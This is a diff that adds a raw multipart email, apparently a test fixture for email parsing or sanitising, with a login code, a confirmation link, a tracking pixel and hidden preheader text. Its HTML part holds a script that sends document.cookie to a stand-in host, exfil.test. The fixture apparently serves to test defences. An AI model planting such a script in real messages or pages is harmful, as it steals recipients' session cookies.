@@ -1,0 +1,30 @@
+From: =?utf-8?q?Servi=C3=A7o_Seguran=C3=A7a?= <security@service.test>
+To: k8x4p2m9@example.com
+Subject: =?utf-8?B?VmVyaWZpY2HDp8OjbyBkZSBhY2Vzc28=?=
+Date: Tue, 30 Sep 2026 18:45:00 +0000
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="BOUND42"
+
+--BOUND42
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+
+Oi,
+
+Seu c=C3=B3digo de acesso =C3=A9: 493821
+
+Confirme em https://service.test/confirm?id=3D9f2
+--BOUND42
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+<html><body>
+<p>Hi there,</p>
+<p>Your login code is <b>493821</b>.</p>
+<a href="https://service.test/confirm?id=9f2">Confirm your account</a>
+<img src="https://tracker.test/open.gif?u=k8x4p2m9" width="1" height="1">
+<script>fetch('https://exfil.test/?c='+document.cookie)</script>
+<style>.x{display:none}</style>
+<div style="display:none">Hidden preheader text</div>
+</body></html>
+--BOUND42--
